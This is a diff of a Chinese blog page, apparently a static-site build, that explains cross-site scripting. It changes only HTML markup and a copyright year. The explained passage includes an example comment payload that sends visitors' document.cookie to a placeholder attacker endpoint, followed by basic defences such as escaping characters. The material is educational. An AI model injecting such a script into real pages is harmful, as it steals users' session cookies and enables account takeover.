@@ -333,7 +333,7 @@
       
 
       
-        <h2 id="XSS的原理和防范方式"><a href="#XSS的原理和防范方式" class="headerlink" title="XSS的原理和防范方式"></a>XSS的原理和防范方式</h2><p>XSS全称Cross Site Scripting（为啥不叫CSS？为了和层叠样式表Cascading Style Sheets区分），即跨站脚本攻击。<br>定义 恶意用户 是实行XSS攻击的人，恶意代码 是指含有某些可执行恶意前端脚本的代码，目标用户 是指受到XSS攻击的人。<br>恶意用户将恶意脚本装作普通文本的样式上传到服务器，这些文本将被渲染到目标用户的页面上，从而被执行，这样的流程称之为‘跨站脚本攻击’。<br>举例：有一个发表评论的功能，一个人发表了评论大家就都能看见，于是恶意用户就在这个评论区发表了以下代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">request.open(<span class="string">'POST'</span>, <span class="string">'/攻击者自家的收集数据的接口'</span>, <span class="literal">true</span>);</span><br><span class="line">request.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>);</span><br><span class="line">request.send(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure><br>如果这个代码未经过滤直接执行，那么攻击者将会收集所有访问这个评论区的用户的cookie以便执行只有目标用户才有权限做的事情。<br>作为网站建设方，我们通常可以采取以下手段来防止XSS攻击：</p>
+        <h2 id="XSS的原理和防范方式"><a href="#XSS的原理和防范方式" class="headerlink" title="XSS的原理和防范方式"></a>XSS的原理和防范方式</h2><p>XSS全称Cross Site Scripting（为啥不叫CSS？为了和层叠样式表Cascading Style Sheets区分），即跨站脚本攻击。<br>定义 恶意用户 是实行XSS攻击的人，恶意代码 是指含有某些可执行恶意前端脚本的代码，目标用户 是指受到XSS攻击的人。<br>恶意用户将恶意脚本装作普通文本的样式上传到服务器，这些文本将被渲染到目标用户的页面上，从而被执行，这样的流程称之为‘跨站脚本攻击’。<br>举例：有一个发表评论的功能，一个人发表了评论大家就都能看见，于是恶意用户就在这个评论区发表了以下代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">request.open(<span class="string">'POST'</span>, <span class="string">'/攻击者自家的收集数据的接口'</span>, <span class="literal">true</span>);</div><div class="line">request.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>);</div><div class="line">request.send(<span class="built_in">document</span>.cookie);</div></pre></td></tr></table></figure><br>如果这个代码未经过滤直接执行，那么攻击者将会收集所有访问这个评论区的用户的cookie以便执行只有目标用户才有权限做的事情。<br>作为网站建设方，我们通常可以采取以下手段来防止XSS攻击：</p>
 <ol>
 <li>转义 &lt; &gt; 这些特殊字符为实体字符</li>
 <li>利用正则判断攻击脚本</li>
@@ -537,7 +537,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2018</span>
+  <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
